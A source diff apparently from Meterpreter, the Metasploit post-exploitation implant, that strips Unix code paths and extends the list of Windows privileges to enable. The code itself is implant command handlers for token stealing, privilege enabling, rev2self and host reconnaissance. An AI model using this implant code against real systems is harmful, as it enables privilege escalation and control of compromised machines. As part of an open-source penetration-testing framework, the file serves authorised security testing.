@@ -1,15 +1,10 @@
 #include "precomp.h"
 
-#ifdef _WIN32
 #include <Sddl.h>
 #include <Lm.h>
 #include <psapi.h>
 
 typedef NTSTATUS(WINAPI *PRtlGetVersion)(LPOSVERSIONINFOEXW);
-
-#else
-#include <sys/utsname.h>
-#endif
 
 #pragma comment(lib, "netapi32.lib")
 
@@ -105,7 +100,6 @@ DWORD request_sys_config_getenv(Remote *remote, Packet *packet)
 	return dwResult;
 }
 
-#ifdef _WIN32
 /*
  * @brief Get the token information for the current thread/process.
  * @param pTokenUser Buffer to receive the token data.
@@ -222,7 +216,6 @@ DWORD populate_uid(Packet* pResponse)
 
 	return dwResult;
 }
-#endif
 
 /*
  * @brief Get the user name of the current process/thread.
@@ -235,21 +228,7 @@ DWORD request_sys_config_getuid(Remote* pRemote, Packet* pPacket)
 	Packet *pResponse = packet_create_response(pPacket);
 	DWORD dwResult = ERROR_SUCCESS;
 
-#ifdef _WIN32
 	dwResult = populate_uid(pResponse);
-#else
-	CHAR info[512];
-	uid_t ru, eu, su;
-	gid_t rg, eg, sg;
-
-	ru = eu = su = rg = eg = sg = 31337;
-
-	getresuid(&ru, &eu, &su);
-	getresgid(&rg, &eg, &sg);
-
-	snprintf(info, sizeof(info)-1, "uid=%d, gid=%d, euid=%d, egid=%d, suid=%d, sgid=%d", ru, rg, eu, eg, su, sg);
-	packet_add_tlv_string(pResponse, TLV_TYPE_USER_NAME, info);
-#endif
 
 	// Transmit the response
 	packet_transmit_response(dwResult, pRemote, pResponse);
@@ -268,12 +247,8 @@ DWORD request_sys_config_drop_token(Remote* pRemote, Packet* pPacket)
 	Packet* pResponse = packet_create_response(pPacket);
 	DWORD dwResult = ERROR_SUCCESS;
 
-#ifdef _WIN32
 	core_update_thread_token(pRemote, NULL);
 	dwResult = populate_uid(pResponse);
-#else
-	dwResult = ERROR_NOT_SUPPORTED;
-#endif
 
 	// Transmit the response
 	packet_transmit_response(dwResult, pRemote, pResponse);
@@ -291,41 +266,47 @@ DWORD request_sys_config_drop_token(Remote* pRemote, Packet* pPacket)
 DWORD request_sys_config_getprivs(Remote *remote, Packet *packet)
 {
 	Packet *response = packet_create_response(packet);
-#ifdef _WIN32
 	DWORD res = ERROR_SUCCESS;
 	HANDLE token = NULL;
 	int x;
 	TOKEN_PRIVILEGES priv = {0};
 	LPCTSTR privs[] = {
-		SE_DEBUG_NAME,
-		SE_TCB_NAME,
-		SE_CREATE_TOKEN_NAME,
 		SE_ASSIGNPRIMARYTOKEN_NAME,
-		SE_LOCK_MEMORY_NAME,
-		SE_INCREASE_QUOTA_NAME,
-		SE_UNSOLICITED_INPUT_NAME,
-		SE_MACHINE_ACCOUNT_NAME,
-		SE_SECURITY_NAME,
-		SE_TAKE_OWNERSHIP_NAME,
-		SE_LOAD_DRIVER_NAME,
-		SE_SYSTEM_PROFILE_NAME,
-		SE_SYSTEMTIME_NAME,
-		SE_PROF_SINGLE_PROCESS_NAME,
-		SE_INC_BASE_PRIORITY_NAME,
+		SE_AUDIT_NAME,
+		SE_BACKUP_NAME,
+		SE_CHANGE_NOTIFY_NAME,
+		SE_CREATE_GLOBAL_NAME,
 		SE_CREATE_PAGEFILE_NAME,
 		SE_CREATE_PERMANENT_NAME,
-		SE_BACKUP_NAME,
-		SE_RESTORE_NAME,
-		SE_SHUTDOWN_NAME,
-		SE_AUDIT_NAME,
-		SE_SYSTEM_ENVIRONMENT_NAME,
-		SE_CHANGE_NOTIFY_NAME,
-		SE_REMOTE_SHUTDOWN_NAME,
-		SE_UNDOCK_NAME,
-		SE_SYNC_AGENT_NAME,
+		SE_CREATE_SYMBOLIC_LINK_NAME,
+		SE_CREATE_TOKEN_NAME,
+		SE_DEBUG_NAME,
 		SE_ENABLE_DELEGATION_NAME,
+		SE_IMPERSONATE_NAME,
+		SE_INC_BASE_PRIORITY_NAME,
+		SE_INCREASE_QUOTA_NAME,
+		SE_INC_WORKING_SET_NAME,
+		SE_LOAD_DRIVER_NAME,
+		SE_LOCK_MEMORY_NAME,
+		SE_MACHINE_ACCOUNT_NAME,
 		SE_MANAGE_VOLUME_NAME,
-		0
+		SE_PROF_SINGLE_PROCESS_NAME,
+		SE_RELABEL_NAME,
+		SE_REMOTE_SHUTDOWN_NAME,
+		SE_RESTORE_NAME,
+		SE_SECURITY_NAME,
+		SE_SHUTDOWN_NAME,
+		SE_SYNC_AGENT_NAME,
+		SE_SYSTEM_ENVIRONMENT_NAME,
+		SE_SYSTEM_PROFILE_NAME,
+		SE_SYSTEMTIME_NAME,
+		SE_TAKE_OWNERSHIP_NAME,
+		SE_TCB_NAME,
+		SE_TIME_ZONE_NAME,
+		SE_TRUSTED_CREDMAN_ACCESS_NAME,
+		SE_UNDOCK_NAME,
+		SE_UNSOLICITED_INPUT_NAME,
+		NULL
 	};
 
 	do
@@ -353,9 +334,7 @@ DWORD request_sys_config_getprivs(Remote *remote, Packet *packet)
 
 	if(token)
 		CloseHandle(token);
-#else
-	DWORD res = ERROR_NOT_SUPPORTED;
-#endif
+
 	// Transmit the response
 	packet_transmit_response(res, remote, response);
 
@@ -372,7 +351,6 @@ DWORD request_sys_config_steal_token(Remote *remote, Packet *packet)
 {
 	Packet *response = packet_create_response(packet);
 	DWORD dwResult = ERROR_SUCCESS;
-#ifdef _WIN32
 	HANDLE hToken = NULL;
 	HANDLE hProcessHandle = NULL;
 	HANDLE hDupToken = NULL;
@@ -436,16 +414,12 @@ DWORD request_sys_config_steal_token(Remote *remote, Packet *packet)
 	{
 		CloseHandle(hToken);
 	}
-#else
-	dwResult = ERROR_NOT_SUPPORTED;
-#endif
 	// Transmit the response
 	packet_transmit_response(dwResult, remote, response);
 
 	return dwResult;
 }
 
-#ifdef _WIN32
 DWORD add_windows_os_version(Packet** packet)
 {
 	DWORD dwResult = ERROR_SUCCESS;
@@ -548,7 +522,7 @@ DWORD add_windows_os_version(Packet** packet)
 		{
 			if (v.dwMinorVersion == 0)
 			{
-				osName = v.wProductType == VER_NT_WORKSTATION ? "Windows 10" : "Windows 2016 Tech Preview";
+				osName = v.wProductType == VER_NT_WORKSTATION ? "Windows 10" : "Windows 2016";
 			}
 		}
 
@@ -572,7 +546,6 @@ DWORD add_windows_os_version(Packet** packet)
 
 	return dwResult;
 }
-#endif
 
 /*
  * @brief Handle the request to get local date/time information.
@@ -586,7 +559,6 @@ DWORD request_sys_config_localtime(Remote* remote, Packet* packet)
 	DWORD result = ERROR_SUCCESS;
 	char dateTime[128] = { 0 };
 
-#ifdef _WIN32
 	TIME_ZONE_INFORMATION tzi = { 0 };
 	SYSTEMTIME localTime = { 0 };
 
@@ -598,14 +570,6 @@ DWORD request_sys_config_localtime(Remote* remote, Packet* packet)
 		localTime.wHour, localTime.wMinute, localTime.wSecond, localTime.wMilliseconds,
 		tziResult == TIME_ZONE_ID_DAYLIGHT ? tzi.DaylightName : tzi.StandardName,
 		tzi.Bias > 0 ? "-" : "+", abs(tzi.Bias / 60 * 100));
-#else
-	time_t t = time(NULL);
-	struct tm lt = { 0 };
-	localtime_r(&t, &lt);
-	// TODO: bug? Ping @bcook-r7
-	// For some reason I don't see the correct TZ name/offset coming through. Bionic issue?
-	strftime(dateTime, sizeof(dateTime) - 1, "%Y-%m-%d %H:%M:%S %Z (UTC%z)", &lt);
-#endif
 
 	dprintf("[SYSINFO] Local Date/Time: %s", dateTime);
 	packet_add_tlv_string(response, TLV_TYPE_LOCAL_DATETIME, dateTime);
@@ -625,7 +589,6 @@ DWORD request_sys_config_localtime(Remote* remote, Packet* packet)
 DWORD request_sys_config_sysinfo(Remote *remote, Packet *packet)
 {
 	Packet *response = packet_create_response(packet);
-#ifdef _WIN32
 	CHAR computer[512], buf[512], * osArch = NULL;
 	DWORD res = ERROR_SUCCESS;
 	DWORD size = sizeof(computer);
@@ -743,29 +706,7 @@ DWORD request_sys_config_sysinfo(Remote *remote, Packet *packet)
 			dprintf("[CONFIG] Failed to get local system info for logged on user count / domain");
 		}
 	} while (0);
-#else
-	CHAR os[512];
 
-	DWORD res = ERROR_SUCCESS;
-
-	do {
-		struct utsname utsbuf;
-		if (uname(&utsbuf) == -1) {
-			res = GetLastError();
-			break;
-		}
-
-		snprintf(os, sizeof(os), "%s %s %s %s (%s)",
-			utsbuf.sysname, utsbuf.nodename, utsbuf.release,
-			utsbuf.version, utsbuf.machine);
-
-		packet_add_tlv_string(response, TLV_TYPE_COMPUTER_NAME, utsbuf.nodename);
-		packet_add_tlv_string(response, TLV_TYPE_OS_NAME, os);
-		packet_add_tlv_string(response, TLV_TYPE_ARCHITECTURE, utsbuf.machine);
-
-	} while(0);
-
-#endif
 	// Transmit the response
 	packet_transmit_response(res, remote, response);
 
@@ -780,7 +721,6 @@ DWORD request_sys_config_sysinfo(Remote *remote, Packet *packet)
  */
 DWORD request_sys_config_rev2self(Remote *remote, Packet *packet)
 {
-#ifdef _WIN32
 	DWORD dwResult    = ERROR_SUCCESS;
 	Packet * response = NULL;
 
@@ -805,10 +745,6 @@ DWORD request_sys_config_rev2self(Remote *remote, Packet *packet)
 	if (response)
 		packet_transmit_response(dwResult, remote, response);
 
-#else
-	DWORD dwResult = ERROR_NOT_SUPPORTED;
-#endif
-
 	return dwResult;
 }
 
@@ -820,7 +756,6 @@ DWORD request_sys_config_driver_list(Remote *remote, Packet *packet)
 	Packet* response = packet_create_response(packet);
 	DWORD result = ERROR_SUCCESS;
 
-#ifdef _WIN32
 	LPVOID ignored = NULL;
 	DWORD sizeNeeded = 0;
 
@@ -895,9 +830,6 @@ DWORD request_sys_config_driver_list(Remote *remote, Packet *packet)
 			result = ERROR_OUTOFMEMORY;
 		}
 	}
-#else
-	result = ERROR_NOT_SUPPORTED;
-#endif
 
 	packet_transmit_response(result, remote, response);
 
